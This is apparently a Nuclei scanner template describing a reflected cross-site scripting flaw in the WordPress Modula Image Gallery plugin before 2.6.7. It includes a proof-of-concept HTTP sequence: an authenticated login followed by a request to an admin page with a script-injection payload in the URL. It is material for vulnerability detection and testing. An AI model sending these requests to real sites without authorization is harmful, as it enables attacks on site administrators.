# Nuclei Template: WordPress Modula Image Gallery <2.6.7 - Cross-Site Scripting
**Template ID:** modula-image-gallery-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`modula-image-gallery-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/ee248078-89ee-4cc0-b0fe-e932cd00db3e
- https://wordpress.org/plugins/modula-best-grid-gallery
